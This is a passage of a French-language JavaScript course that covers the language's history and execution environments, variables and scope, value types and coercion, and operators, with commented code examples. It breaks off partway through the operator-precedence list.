# JavaScript — Cours complet

*Cours magistral en 25 modules, des variables aux modules, du DOM à l'asynchrone et à Temporal — ECMAScript 2026*

## Comment utiliser ce cours

Ce document développe, module par module, le plan « JavaScript — Guide complet ». Chaque module suit la même progression : **définitions** (le vocabulaire exact), **fonctionnement** (ce que fait réellement le langage), **exemples commentés**, **pièges et erreurs fréquentes**, **bonnes pratiques**, puis **points clés** de synthèse.

**Prérequis** : savoir utiliser un éditeur de texte et un navigateur. Aucune expérience de programmation n'est supposée, mais le rythme est soutenu.

**Conventions** : `console.log` affiche un résultat ; `console.error` signale une erreur volontaire (le code fautif est alors dans un `try...catch`). Les exemples s'exécutent dans Node.js ou dans la console du navigateur ; ceux qui touchent au DOM, au stockage ou à la navigation demandent un navigateur ; ceux qui utilisent `fetch` demandent une connexion Internet.

**Méthode de lecture recommandée** : lisez les modules dans l'ordre, exécutez chaque exemple dans la console du navigateur ou dans Node.js, et modifiez-le pour observer le comportement du langage.

## 1. Introduction

### 1.1 Qu'est-ce que JavaScript ?

**JavaScript** (JS) est un langage de programmation créé en 1995 par Brendan Eich chez Netscape (il s'appelait d'abord Mocha, puis LiveScript, avant d'être rebaptisé JavaScript pour des raisons commerciales : Java était alors à la mode). **JavaScript n'a aucun lien avec Java**, hormis une ressemblance de nom et une syntaxe en accolades héritée du langage C.

#### Histoire et standardisation

- **1996-1997** : pour éviter que chaque navigateur ait son dialecte, le langage est confié à l'organisme **Ecma International**. La norme s'appelle **ECMA-262** et le langage normalisé **ECMAScript** (ES). JavaScript est l'implémentation la plus connue de cette norme.
- **ES3 (1999)** : expressions régulières, `try/catch`. **ES5 (2009)** : mode strict, JSON natif, méthodes de tableaux (`map`, `filter`…). **ES2015 (ES6)** : la grande refonte (`let`/`const`, classes, modules, promesses, fonctions fléchées…).
- **Depuis 2015** : une édition **chaque année**, pilotée par le comité **TC39**. Une proposition passe par des **stades** : 0 (idée), 1 (proposition), 2 (brouillon), 2.7 (revue), 3 (candidate, à implémenter), **4 (terminée, intégrée à la prochaine édition)**.

#### Les caractéristiques du langage

| Caractéristique | Signification |
| --- | --- |
| **Interprété / compilé à la volée (JIT)** | Le moteur lit le code source et le compile en code machine pendant l'exécution, en optimisant les parties les plus utilisées. Il n'y a pas d'étape de compilation manuelle. |
| **Dynamique** | Les types sont attachés aux **valeurs**, pas aux variables : une même variable peut contenir successivement un nombre puis une chaîne. Les types sont vérifiés à l'exécution. |
| **Faiblement typé** | Le langage convertit implicitement les types dans certaines opérations (`'5' * 2` donne `10`). |
| **Multi-paradigme** | Il autorise le style impératif, objet (par prototypes) et fonctionnel. |
| **Fonctions de première classe** | Une fonction est une valeur : on la stocke, la passe en argument, la retourne. |
| **À événements, non bloquant** | Un seul fil d'exécution, mais les opérations lentes (réseau, minuteries) sont déléguées et leurs résultats traités plus tard (module 16). |
| **Ramasse-miettes** | La mémoire est libérée automatiquement quand une valeur n'est plus atteignable. |

#### Moteur, environnement d'exécution et API

Il faut distinguer trois notions :

1. **Le langage** (ECMAScript) : variables, fonctions, objets, `Array`, `Promise`, `Map`, `JSON`, `Math`…
2. **Le moteur** : le programme qui exécute le langage (V8 dans Chrome, Edge et Node.js ; SpiderMonkey dans Firefox ; JavaScriptCore dans Safari et Bun).
3. **L'environnement hôte** : il fournit des **API** qui ne font pas partie du langage. Le navigateur apporte `document`, `window`, `fetch`, `localStorage` ; Node.js apporte `fs`, `process`, `http`.

Conséquence pratique : `document` n'existe pas dans Node.js, et le module `fs` n'existe pas dans un navigateur. Quand une erreur dit qu'un nom « n'est pas défini », demandez-vous d'abord si l'environnement le fournit.

| Environnement | Exemples |
| --- | --- |
| Navigateur | Chrome / Edge (V8), Firefox (SpiderMonkey), Safari (JavaScriptCore) |
| Serveur et outils | Node.js, Deno, Bun |
| Mobile et bureau | React Native, Electron, Tauri |
| Edge / embarqué | Cloudflare Workers, Deno Deploy |

**TypeScript** est un sur-ensemble de JavaScript qui ajoute des types vérifiés avant l'exécution ; il est ensuite converti en JavaScript (module 24).

### 1.2 Exécuter du JavaScript

#### Dans une page web

```html
<!-- Script classique : bloque l'analyse du HTML pendant le chargement -->
<script src='app.js'></script>

<!-- defer : téléchargé en parallèle, exécuté après l'analyse du HTML, dans l'ordre -->
<script src='app.js' defer></script>

<!-- async : exécuté dès qu'il est prêt, sans garantie d'ordre (scripts indépendants) -->
<script src='stats.js' async></script>

<!-- Module ES : différé par défaut, mode strict, portée propre -->
<script type='module' src='main.js'></script>
```

Règle simple : placez `defer` (ou `type='module'`) sur vos scripts applicatifs ; réservez `async` aux scripts indépendants (statistiques, publicité). Un script **inline** (écrit entre les balises) est possible mais déconseillé, car une politique de sécurité de contenu (CSP) stricte l'interdit.

#### Dans la console du navigateur

Touche `F12`, onglet **Console** : on y saisit du code qui s'exécute immédiatement. C'est l'outil idéal pour expérimenter.

#### Avec Node.js

```bash
node script.js            # exécute un fichier
node --watch script.js    # relance à chaque modification
node                      # console interactive (REPL)
```

```javascript
console.log('Bonjour le monde !');
console.table([{ nom: 'Alice', age: 30 }]);   // affichage en tableau
console.error('Une erreur');                  // affichée comme un message d'erreur
```

### 1.3 Syntaxe de base

#### Instructions et expressions

Un programme est une suite d'**instructions** (*statements*) : elles **font** quelque chose (déclarer, boucler, brancher). Une **expression** **produit une valeur** (`2 + 3`, `nom.length`, `f(4)`). Là où le langage attend une expression, on ne peut pas mettre une instruction : c'est pourquoi `const x = if (a) 1;` est invalide, alors que `const x = a ? 1 : 2;` est valide.

```javascript
// Commentaire sur une ligne
/* Commentaire
   sur plusieurs lignes */

let message = 'Salut';   // déclaration + initialisation (instruction)
console.log(message);     // appel de fonction (expression) : 'Salut'
```

#### Points-virgules et insertion automatique (ASI)

Le moteur insère parfois un point-virgule lui-même (*Automatic Semicolon Insertion*). Cela donne l'illusion qu'ils sont facultatifs, mais cela crée des pièges :

```javascript
function mauvais() {
    return            // le moteur insère un ';' ici : la fonction renvoie undefined
    { ok: true };
}
console.log(mauvais());   // undefined
```

Règle : **terminez vos instructions par `;`** (ou adoptez un formateur automatique comme Prettier qui tranche pour vous) et ne passez jamais à la ligne juste après `return`.

#### Identifiants et conventions

- JavaScript est **sensible à la casse** : `nom`, `Nom` et `NOM` sont trois identifiants différents.
- Un identifiant commence par une lettre, `_` ou `$`, puis peut contenir des chiffres. Les lettres Unicode sont admises (`const prénom = 'Zoé';`).
- Les **mots réservés** (`class`, `const`, `function`, `return`, `if`, `new`, `this`…) ne peuvent pas servir de noms de variables.
- Conventions : **`camelCase`** pour variables et fonctions (`nombreDeLignes`), **`PascalCase`** pour classes et constructeurs (`CompteBancaire`), **`MAJUSCULES_AVEC_TIRETS_BAS`** pour de vraies constantes globales (`DELAI_MAX`). Un bon nom est descriptif ; les noms de fonctions commencent par un verbe (`calculerTotal`).

#### Afficher des informations

| Méthode | Usage |
| --- | --- |
| `console.log()` | Affichage général |
| `console.error()` / `console.warn()` / `console.info()` | Erreurs, avertissements, informations |
| `console.table()` | Tableaux et objets en table |
| `console.dir(obj, { depth: null })` | Inspection complète d'un objet |
| `console.time()` / `console.timeEnd()` | Mesure de durée |
| `console.assert(cond, msg)` | Message seulement si la condition est fausse |

### Points clés du module 1

- JavaScript est le langage ; ECMAScript est sa norme ; le moteur l'exécute ; l'environnement fournit les API (DOM, `fetch`, `fs`).
- Le langage est dynamique, à fonctions de première classe, mono-thread et événementiel.
- Utilisez `defer` ou `type='module'` pour charger les scripts.
- Terminez les instructions par `;` et soignez les noms.

## 2. Variables et portée

### 2.1 Déclarer une variable

Une **variable** est un nom lié à une valeur en mémoire. Trois étapes à distinguer : la **déclaration** (créer le nom), l'**initialisation** (donner sa première valeur) et l'**affectation** (changer la valeur ensuite).

```javascript
let compteur;          // déclaration seule : valeur undefined
compteur = 1;          // première affectation
compteur = compteur + 1;
console.log(compteur); // 2

let total = 0;         // déclaration + initialisation
```

| Mot-clé | Portée | Réaffectation | Redéclaration | Hoisting |
| --- | --- | --- | --- | --- |
| `var` *(ancien)* | Fonction | Oui | Oui | Remontée, valeur `undefined` |
| `let` | **Bloc** | Oui | Non | Remontée, mais en **zone morte temporelle** |
| `const` | **Bloc** | Non | Non | Idem `let` |

```javascript
let ville = 'Tokyo';
ville = 'Kyoto';                  // autorisé
console.log(ville);               // 'Kyoto'

const pays = 'Japon';
try {
    pays = 'Corée';               // interdit
} catch (e) {
    console.error(e.name, e.message);   // TypeError Assignment to constant variable.
}

const utilisateur = { nom: 'Alice' };
utilisateur.nom = 'Bob';          // autorisé : l'objet est modifiable
console.log(utilisateur);         // { nom: 'Bob' }
```

**Point essentiel** : `const` interdit de **réaffecter le nom**, pas de **modifier le contenu** d'un objet ou d'un tableau. Pour rendre un objet immuable (superficiellement), on utilise `Object.freeze` (module 9).

**Pourquoi éviter `var` ?** Il n'a pas de portée de bloc, autorise les redéclarations silencieuses et crée des propriétés sur l'objet global. Ses défauts ont motivé l'invention de `let` et `const`.

> **Bonne pratique** : `const` par défaut ; `let` uniquement si la variable doit changer ; jamais `var` dans du code nouveau.

### 2.2 Portée (*scope*)

La **portée** d'une variable est la zone du code où son nom est accessible.

| Portée | Description |
| --- | --- |
| **Globale** | Visible partout ; rattachée à `globalThis` pour `var` et les fonctions d'un script classique |
| **Module** | Propre à un fichier ES module : rien n'en sort sans `export` |
| **Fonction** | Variables déclarées dans le corps d'une fonction |
| **Bloc** | Entre `{ }` (`if`, `for`, bloc isolé) pour `let`, `const` et `class` |

```javascript
function saluer() {
    var message = 'Bonjour';     // portée de fonction
    console.log(message);
}
saluer();

{
    let x = 10;                  // portée de bloc
    const y = 20;
    console.log(x + y);          // 30
}

try {
    console.log(x);              // x n'existe pas hors du bloc
} catch (e) {
    console.error(e.name, e.message);   // ReferenceError x is not defined
}
```

#### Chaîne de portées et masquage

Quand le moteur cherche un nom, il regarde la portée courante, puis la portée englobante, et ainsi de suite jusqu'à la portée globale : c'est la **chaîne de portées**. Une variable interne qui porte le même nom qu'une variable externe la **masque** (*shadowing*) :

```javascript
const niveau = 'global';
function test() {
    const niveau = 'local';       // masque la variable globale
    console.log(niveau);          // 'local'
}
test();
console.log(niveau);              // 'global'
```

#### Variables globales implicites

Affecter un nom jamais déclaré (`x = 10;`) crée en mode sloppy une **variable globale accidentelle** ; en mode strict, c'est une `ReferenceError` (module 15). Déclarez toujours vos variables.

### 2.3 Hoisting et zone morte temporelle (TDZ)

Avant d'exécuter une portée, le moteur la **parcourt** et enregistre ses déclarations : c'est le **hoisting** (« remontée »). Les déclarations sont donc connues dès le début de leur portée, mais pas toutes initialisées de la même façon :

| Déclaration | État au début de sa portée |
| --- | --- |
| `var` | Créée et initialisée à `undefined` |
| `let`, `const`, `class` | Créée mais **non initialisée** : zone morte temporelle (TDZ) jusqu'à la ligne de déclaration |
| `function nom() {}` | Créée **et** initialisée avec sa définition complète |
| Expression de fonction (`const f = function(){}`) | Suit la règle de la variable qui la porte |

```javascript
console.log(a);   // undefined : var remontée, sans sa valeur
var a = 5;

try {
    console.log(b);   // b est dans la TDZ
} catch (e) {
    console.error(e.name, e.message);   // ReferenceError Cannot access 'b' before initialization
}
let b = 10;

saluer();             // 'Salut' : la déclaration de fonction est remontée en entier
function saluer() { console.log('Salut'); }
```

La TDZ est **volontaire** : elle transforme un bug silencieux (`undefined` inattendu) en erreur immédiate et explicite.

### 2.4 Affectation par décomposition (*destructuring*)

La **décomposition** extrait plusieurs valeurs d'un tableau ou d'un objet en une seule instruction.

#### Décomposition de tableau (par position)

```javascript
let [a, b, ...reste] = [1, 2, 3, 4];
console.log(a, b, reste);          // 1 2 [3, 4]

const [premier, , troisieme] = ['x', 'y', 'z'];   // une virgule saute un élément
console.log(premier, troisieme);   // 'x' 'z'

const [p = 0, q = 0] = [5];        // valeurs par défaut (utilisées si undefined)
console.log(p, q);                 // 5 0

[a, b] = [b, a];                   // échange sans variable temporaire
console.log(a, b);                 // 2 1
```

Elle fonctionne avec **tout itérable** (chaînes, `Set`, `Map`, générateurs) : `const [c1, c2] = 'ok';`.

#### Décomposition d'objet (par nom)

```javascript
const { nom, age = 18, ville: v } = { nom: 'Alice', ville: 'Paris' };
console.log(nom, age, v);          // 'Alice' 18 'Paris'  (défaut et renommage)

const { adresse: { rue, cp } } = { adresse: { rue: 'Rue A', cp: '75001' } };   // imbriquée
console.log(rue, cp);

const { id, ...autres } = { id: 7, a: 1, b: 2 };   // reste d'objet
console.log(id, autres);           // 7 { a: 1, b: 2 }

function afficher({ nom, age = 18 } = {}) {        // dans les paramètres
    console.log(`${nom} a ${age} ans`);
}
afficher({ nom: 'Bob' });          // 'Bob a 18 ans'
```

**Précisions** : la valeur par défaut ne s'applique que pour `undefined` (pas pour `null` ni `0`) ; décomposer `null` ou `undefined` lève une `TypeError` ; pour affecter à des variables déjà déclarées avec un objet, entourez l'instruction de parenthèses : `({ a, b } = objet);`.

### 2.5 Bonnes pratiques et erreurs fréquentes

- Déclarez les variables **au plus près de leur usage** et dans la **plus petite portée** possible.
- Une variable = un rôle ; ne réutilisez pas un nom pour autre chose.
- Évitez les variables globales (collisions, tests difficiles).
- Ne déclarez pas de `let`/`const` directement dans un `case` sans accolades : tous les `case` partagent le même bloc. Écrivez `case 1: { const x = 1; break; }`.
- Erreur classique : croire que `const` rend un objet immuable.

### Points clés du module 2

- `const` par défaut, `let` si réaffectation, pas de `var`.
- `let`/`const` ont une portée de bloc ; `var` une portée de fonction.
- Hoisting : les déclarations sont connues dès le début de la portée ; `let`/`const` sont en TDZ avant leur ligne.
- La décomposition extrait des valeurs par position (tableaux) ou par nom (objets), avec défauts, renommage et reste.

## 3. Types de valeurs

### 3.1 Primitifs et références

JavaScript possède **huit types** : sept **primitifs** et le type **objet**.

| Type | Exemple | Remarque |
| --- | --- | --- |
| `string` | `'Bonjour'` | Suite de caractères UTF-16, immuable |
| `number` | `42`, `3.14`, `NaN`, `Infinity` | Flottant 64 bits IEEE 754 |
| `boolean` | `true`, `false` |  |
| `null` | `null` | Absence **volontaire** de valeur |
| `undefined` | `undefined` | Valeur **non définie** (variable non initialisée, propriété absente, fonction sans `return`) |
| `bigint` | `1234567890123456789n` | Entiers de taille arbitraire |
| `symbol` | `Symbol('id')` | Identifiant unique et non devinable |
| `object` | `{}`, `[]`, `function(){}`, `new Date()` | Tout le reste : tableaux, fonctions, dates, `Map`, `Set`, `RegExp`… |

Les **primitifs** sont **immuables** et comparés et copiés **par valeur**. Les **objets** sont **mutables** et manipulés **par référence** : la variable contient une adresse, pas l'objet lui-même.

```javascript
let a = 10;
let b = a;           // copie de la valeur
b = 20;
console.log(a, b);   // 10 20

const o1 = { nom: 'Tom' };
const o2 = o1;       // copie de la RÉFÉRENCE : un seul objet, deux noms
o2.nom = 'Jerry';
console.log(o1.nom); // 'Jerry'

console.log({} === {});        // false : deux objets distincts
console.log(o1 === o2);        // true  : même référence
```

#### `null` ou `undefined` ?

`undefined` est la valeur « par défaut » attribuée par le langage ; `null` est une valeur que **vous** placez pour dire « il n'y a volontairement rien ». Pour tester les deux à la fois : `x == null`, ou `x ?? valeurParDefaut`.

#### Les symboles

```javascript
const id1 = Symbol('id');
const id2 = Symbol('id');
console.log(id1 === id2);                 // false : chaque symbole est unique

const utilisateur = { nom: 'Alice', [id1]: 42 };   // clé symbolique : non énumérée par for...in / Object.keys
console.log(utilisateur[id1]);            // 42

const partage = Symbol.for('app.cle');    // registre global : même symbole pour la même clé
console.log(partage === Symbol.for('app.cle'));   // true
```

Les **symboles bien connus** (`Symbol.iterator`, `Symbol.toPrimitive`, `Symbol.hasInstance`…) permettent de personnaliser le comportement du langage (modules 13, 18 et 19).

#### Les objets enveloppes (*wrappers*)

Une primitive n'a pas de méthodes ; quand on écrit `'abc'.toUpperCase()`, le moteur crée temporairement un objet `String`, appelle la méthode, puis le jette. N'écrivez jamais `new String('a')`, `new Number(1)` ou `new Boolean(false)` : ce sont des **objets** (et `new Boolean(false)` est *truthy* !). Utilisez `String(x)`, `Number(x)`, `Boolean(x)` **sans** `new`.

### 3.2 Copier un objet : superficiel ou profond

Une **copie superficielle** duplique le premier niveau ; les objets imbriqués restent **partagés**. Une **copie profonde** duplique toute la structure.

```javascript
const o1 = { nom: 'Tom', date: new Date(0), tags: ['a'] };

const copie1 = { ...o1 };                  // superficielle
const copie2 = Object.assign({}, o1);      // superficielle
const copie3 = structuredClone(o1);        // PROFONDE

console.log(copie1.tags === o1.tags);      // true  : tableau partagé
console.log(copie3.tags === o1.tags);      // false : copie indépendante
console.log(copie3.date instanceof Date);  // true  : le type Date est préservé

// JSON.parse(JSON.stringify(o)) perd Date, Map, Set, undefined, fonctions…
console.log(typeof JSON.parse(JSON.stringify(o1)).date);   // 'string'
```

**Limites de `structuredClone`** : il lève une `DataCloneError` si l'objet contient une **fonction**, et les instances de classes perdent leur prototype (elles redeviennent des objets ordinaires). Il gère en revanche les dates, `Map`, `Set`, tableaux typés et les **références circulaires**.

### 3.3 L'opérateur `typeof`

```javascript
console.log(typeof 'Salut');         // 'string'
console.log(typeof 42);              // 'number'
console.log(typeof true);            // 'boolean'
console.log(typeof undefined);       // 'undefined'
console.log(typeof 10n);             // 'bigint'
console.log(typeof Symbol());        // 'symbol'
console.log(typeof function () {});  // 'function'
console.log(typeof null);            // 'object'  (bug historique conservé)
console.log(typeof []);              // 'object'  : utilisez Array.isArray()
console.log(Array.isArray([]));      // true
console.log(typeof inconnue);        // 'undefined' : ne lève pas d'erreur pour un nom jamais déclaré
```

Pour distinguer précisément les objets : `Array.isArray(x)`, `x instanceof Date`, ou `Object.prototype.toString.call(x)` (`'[object Date]'`).

### 3.4 Conversions et coercition

La **conversion** est **explicite** quand vous la demandez (`Number('42')`) ; la **coercition** est **implicite** quand le langage la décide (`'5' - 3`).

#### Conversion en nombre (`ToNumber`)

| Valeur | `Number(valeur)` |
| --- | --- |
| `'42'`, `' 42 '` | `42` (espaces ignorés) |
| `''` | `0` |
| `'abc'`, `'12px'` | `NaN` |
| `true` / `false` | `1` / `0` |
| `null` | `0` |
| `undefined` | `NaN` |
| `[]` / `[5]` / `[1,2]` | `0` / `5` / `NaN` |

`parseInt('42px')` (→ `42`) et `parseFloat('3.14abc')` (→ `3.14`) lisent le début de la chaîne et s'arrêtent au premier caractère invalide ; passez toujours la base : `parseInt('08', 10)`.

#### Conversion en chaîne et en booléen

```javascript
console.log(String(123), String(null), String([1, 2]), String({}));   // '123' 'null' '1,2' '[object Object]'
console.log(Boolean(0), Boolean('0'), Boolean([]), Boolean({}));        // false true true true
console.log(!!'texte');           // true : double négation = conversion en booléen
```

**Valeurs « falsy »** (converties en `false`) : `false`, `0`, `-0`, `0n`, `''`, `null`, `undefined`, `NaN`. **Tout le reste est « truthy »**, y compris `'0'`, `'false'`, `[]` et `{}`.

#### Coercition implicite

- L'opérateur **`+`** : si un opérande est une chaîne, il **concatène** ; sinon il additionne. Tous les autres opérateurs arithmétiques (`- * / %`) convertissent en nombre.
- Les conditions (`if`, `while`, `!`, `&&`, `||`, ternaire) convertissent en booléen.
- Les objets sont d'abord convertis en primitifs (`ToPrimitive`) via `valueOf()` puis `toString()`, ou via `[Symbol.toPrimitive]`.

```javascript
console.log('5' + 3);        // '53'
console.log('5' - 3);        // 2
console.log(true + 1);       // 2
console.log([] + {});        // '[object Object]'
console.log([] + []);        // ''
console.log(+'42');          // 42 : le + unaire convertit en nombre
```

### 3.5 Égalité

| Opérateur | Comportement |
| --- | --- |
| `===` / `!==` | Égalité **stricte** : même type **et** même valeur, aucune conversion (recommandée) |
| `==` / `!=` | Égalité **souple** : convertit les types selon des règles complexes |
| `Object.is(a, b)` | Comme `===`, sauf `Object.is(NaN, NaN)` → `true` et `Object.is(0, -0)` → `false` |

```javascript
console.log(0 == '0');            // true  (conversion implicite : piège)
console.log(0 === '0');           // false
console.log(null == undefined);   // true  (seule paire utile pour ==)
console.log(null === undefined);  // false
console.log(NaN === NaN);         // false : seul valeur non égale à elle-même
console.log(Number.isNaN(NaN));   // true
console.log('' == 0, '0' == false, [] == false);   // true true true : à éviter
```

**Règles de `==` (simplifiées)** : si les types sont identiques, c'est `===` ; `null == undefined` est vrai et ne l'est avec rien d'autre ; nombre et chaîne → la chaîne devient nombre ; booléen → converti en nombre ; objet contre primitive → l'objet est converti en primitive. Ces règles sont difficiles à mémoriser : **utilisez toujours `===`**.

Un quatrième algorithme, **SameValueZero**, est utilisé par `Array.prototype.includes`, `Map` et `Set` : comme `===` mais `NaN` égale `NaN` (d'où `[NaN].includes(NaN)` vrai alors que `[NaN].indexOf(NaN)` vaut `-1`).

### Points clés du module 3

- Huit types : sept primitifs (immuables, par valeur) et l'objet (mutable, par référence).
- `typeof null` vaut `'object'` : bug historique ; utilisez `Array.isArray` pour les tableaux.
- Copie superficielle (`...`, `Object.assign`) ≠ copie profonde (`structuredClone`).
- Huit valeurs falsy ; tout le reste est truthy.
- Utilisez `===`, `Number.isNaN` et `Object.is` selon le besoin.

## 4. Opérateurs

### 4.1 Vocabulaire

Un **opérateur** est un symbole qui combine des **opérandes** (les valeurs sur lesquelles il agit) pour produire un résultat. On distingue les opérateurs **unaires** (un opérande : `-x`, `!x`, `typeof x`), **binaires** (deux : `a + b`) et **ternaire** (trois : `condition ? a : b`). Deux notions règlent l'évaluation d'une expression composée : la **priorité** (quel opérateur s'applique en premier) et l'**associativité** (dans quel sens on évalue à priorité égale : de gauche à droite pour `a - b - c`, de droite à gauche pour `**` et l'affectation).

| Catégorie | Opérateurs |
| --- | --- |
| **Arithmétiques** | `+` `-` `*` `/` `%` `**` `++` `--` |
| **Affectation** | `=` `+=` `-=` `*=` `/=` `%=` `**=` |
| **Comparaison** | `==` `===` `!=` `!==` `>` `<` `>=` `<=` |
| **Logiques** | `&&` `\|\|` `!` |
| **Bit à bit** | `&` `\|` `^` `~` `<<` `>>` `>>>` |
| **Type et appartenance** | `typeof` `instanceof` `in` `delete` `void` |
| **Ternaire** | `condition ? a : b` |
| **Fusion nulle** | `??` |
| **Chaînage optionnel** | `?.` |
| **Affectation logique** | `&&=` `\|\|=` `??=` |
| **Décomposition / reste** | `...` |

### 4.2 Opérateurs arithmétiques

```javascript
console.log(7 + 2, 7 - 2, 7 * 2);   // 9 5 14
console.log(7 / 2);                 // 3.5 : la division est toujours flottante
console.log(7 % 3);                 // 1   : reste de la division
console.log(-7 % 3);                // -1  : le reste prend le signe du dividende
console.log(2 ** 10);               // 1024 : exponentiation
console.log(2 ** 3 ** 2);           // 512 : associatif à droite, soit 2 ** (3 ** 2)
console.log(1 / 0, -1 / 0, 0 / 0);  // Infinity -Infinity NaN : pas d'exception
```

- **`%` (reste)** n'est pas le modulo mathématique : `-7 % 3` vaut `-1`. Pour un vrai modulo positif : `((n % m) + m) % m`.
- **`**`** : `-2 ** 2` est une `SyntaxError` (ambiguïté) ; écrivez `(-2) ** 2` ou `-(2 ** 2)`.
- **`+` unaire** convertit en nombre : `+'42'` donne `42`. **`-` unaire** change le signe.

#### Incrément et décrément

```javascript
let i = 5;
console.log(i++);   // 5 : post-incrément, renvoie l'ANCIENNE valeur puis incrémente
console.log(i);     // 6
console.log(++i);   // 7 : pré-incrément, incrémente PUIS renvoie la nouvelle valeur
console.log(i--, --i);   // 7 5
```

Seul, `i++` et `++i` sont équivalents ; la différence n'apparaît que lorsque la valeur est utilisée dans une expression plus grande, ce qui nuit à la lisibilité : préférez `i += 1` quand le résultat est réutilisé.

### 4.3 Opérateurs d'affectation

L'affectation `=` **est elle-même une expression** : elle renvoie la valeur affectée, ce qui permet `a = b = 0` (évalué de droite à gauche). Les formes composées (`x += 3`, `x *= 2`, `x **= 2`, `x %= 5`) évaluent l'opération puis affectent le résultat à la même variable : `x += 3` équivaut à `x = x + 3`.

```javascript
let total = 10;
total += 5;     // 15
total *= 2;     // 30
total **= 2;    // 900
total %= 7;     // 4
console.log(total);

let texte = 'Bon';
texte += 'jour';   // concaténation avec +=
console.log(texte);   // 'Bonjour'
```

### 4.4 Opérateurs de comparaison

Les opérateurs relationnels `<`, `>`, `<=`, `>=` renvoient un booléen. Règles :

- Deux **nombres** : comparaison numérique.
- Deux **chaînes** : comparaison **lexicographique** par unités UTF-16, donc sensible à la casse et au code des caractères (`'Z' < 'a'` est vrai ; `'10' < '9'` est vrai car `'1' < '9'`).
- Types **mixtes** : conversion en nombre (`'10' < 9` est faux car `10 < 9`).
- Avec `NaN` : toute comparaison est fausse (`NaN < 1`, `NaN >= 1`).
- `null >= 0` est vrai (`null` devient `0`) alors que `null == 0` est faux : un piège classique.

```javascript
console.log('a' < 'b', 'Z' < 'a', '10' < '9', 10 < 9);   // true true true false
console.log('10' < 9);                    // false : '10' devient 10
console.log(null >= 0, null == 0);        // true false
console.log(NaN < 1, NaN > 1, NaN === NaN);   // false false false
```

Pour l'égalité (`===`, `==`, `Object.is`), voir le module 3. Pour trier des textes accentués, utilisez `localeCompare` (module 5).

### 4.5 Opérateurs logiques et court-circuit

`&&` (ET), `||` (OU) et `!` (NON). **`&&` et `||` ne renvoient pas forcément un booléen : ils renvoient l'un de leurs opérandes.**

- `a && b` : renvoie `a` si `a` est *falsy*, sinon `b`.
- `a || b` : renvoie `a` si `a` est *truthy*, sinon `b`.

L'évaluation est en **court-circuit** : le second opérande n'est évalué que si nécessaire.

```javascript
console.log(0 || 'défaut');         // 'défaut'
console.log('texte' || 'défaut');   // 'texte'
console.log(1 && 'oui');            // 'oui'
console.log(0 && 'oui');            // 0
console.log(!0, !'a', !!'a');       // true false true

const utilisateur = { nom: 'Alice' };
utilisateur && console.log(utilisateur.nom);   // l'appel n'a lieu que si utilisateur est truthy
```

Priorité : `!` > `&&` > `||`. Ajoutez des parenthèses pour la clarté : `a || (b && c)`.

### 4.6 Fusion nulle `??`

`a ?? b` renvoie `b` **seulement si `a` est `null` ou `undefined`**. Contrairement à `||`, il conserve `0`, `''` et `false`, qui sont souvent des valeurs légitimes.

```javascript
const quantite = 0;
console.log(quantite || 10);   // 10 : piège, 0 est falsy
console.log(quantite ?? 10);   // 0  : seuls null et undefined déclenchent le défaut
console.log(null ?? 'x', undefined ?? 'x', '' ?? 'x');   // 'x' 'x' ''
```

### 4.7 Chaînage optionnel `?.`

Le **chaînage optionnel** arrête l'évaluation et renvoie `undefined` si ce qui précède est `null` ou `undefined`, au lieu de lever une `TypeError`. Trois formes : propriété (`a?.b`), indice (`a?.[0]`), appel (`f?.()`).

```javascript
const utilisateur = { adresse: { ville: 'Paris' } };
const vide = {};
const objet = { methode() { return 'appelée'; } };

console.log(utilisateur?.adresse?.ville);   // 'Paris'
console.log(vide?.adresse?.ville);          // undefined : un maillon est absent
console.log([]?.[0]);                       // undefined
console.log(objet.methode?.());             // 'appelée'
console.log(objet.autre?.());               // undefined : pas d'appel
console.log(vide.adresse?.ville ?? 'inconnue');   // 'inconnue' : combinaison très courante
```

Il teste **uniquement** `null` et `undefined`, pas les autres valeurs falsy. N'en abusez pas : il masque des données manquantes qui devraient parfois lever une erreur.

### 4.8 Affectations logiques

`a ||= b` affecte `b` si `a` est falsy ; `a &&= b` affecte si `a` est truthy ; `a ??= b` affecte si `a` est `null` ou `undefined`. Ils court-circuitent aussi l'**affectation** (pas d'écriture inutile).

```javascript
let a = null;
a ||= '  défaut  ';
a &&= a.trim();
console.log(a);          // 'défaut'

let n;
n ??= 0;
console.log(n);          // 0

const options = { port: 0 };
options.port ??= 3000;   // reste 0 : 0 n'est ni null ni undefined
options.hote ??= 'localhost';
console.log(options);    // { port: 0, hote: 'localhost' }
```

### 4.9 Opérateurs bit à bit

Ils travaillent sur la représentation **entière signée sur 32 bits** de leurs opérandes : `&` (ET), `|` (OU), `^` (OU exclusif), `~` (NON), `<<` (décalage à gauche), `>>` (décalage avec signe), `>>>` (décalage sans signe).

```javascript
console.log(5 & 3, 5 | 3, 5 ^ 3, ~5);   // 1 7 6 -6
console.log(1 << 4, -16 >> 2, -1 >>> 28);   // 16 -4 15
console.log(7.9 | 0, ~~-7.9);          // 7 -7 : troncature (astuce, préférez Math.trunc)

const LECTURE = 1, ECRITURE = 2, EXECUTION = 4;   // drapeaux (flags) combinés avec |
const droits = LECTURE | ECRITURE;
console.log((droits & ECRITURE) !== 0);   // true : test d'un drapeau
```

Usages : drapeaux d'options, masques, calculs bas niveau. Ils ne s'appliquent pas aux nombres au-delà de 32 bits ; pour les `BigInt`, les formes bit à bit existent aussi.

### 4.10 Opérateurs de type, d'appartenance et divers

```javascript
const tableau = [1, 2];
const utilisateur = { nom: 'Alice' };

console.log(typeof 'a');                  // 'string'
console.log(tableau instanceof Array);    // true : Array.prototype est dans la chaîne de prototypes
console.log('nom' in utilisateur);        // true : propriété présente (propres ou héritées)
console.log(0 in tableau);                // true : indice 0 existe
delete utilisateur.nom;                   // supprime la propriété
console.log(utilisateur);                 // {}
console.log(void 0);                      // undefined : void évalue et renvoie undefined
let x = (1, 2, 3);                        // opérateur virgule : évalue tout, renvoie le dernier
console.log(x);                           // 3
```

### 4.11 Ternaire

```javascript
const age = 20;
console.log(age >= 18 ? 'majeur' : 'mineur');   // 'majeur'

// Évitez l'imbrication illisible ; préférez if/else ou une table de correspondance
const categorie = age < 13 ? 'enfant' : age < 18 ? 'ado' : 'adulte';
console.log(categorie);   // 'adulte'
```

### 4.12 Priorité des opérateurs

Ordre approximatif, du plus prioritaire au moins prioritaire :

1. Groupement `( )`, accès `.` `[]`, appel `f()`, `?.`
2. `++` `--` suffixes, puis opérateurs unaires `!` `~` `+` `-` `typeof` `delete`, puis `++` `--` préfixes
3. `**` (associatif à droite)
4. `*` `/` `%`
5. `+` `-`
6. Décalages `<<` `>>` `>>>`
7. `<` `<=` `>` `>=` `in` `instanceof`
8. `==` `!=` `===` `!==`
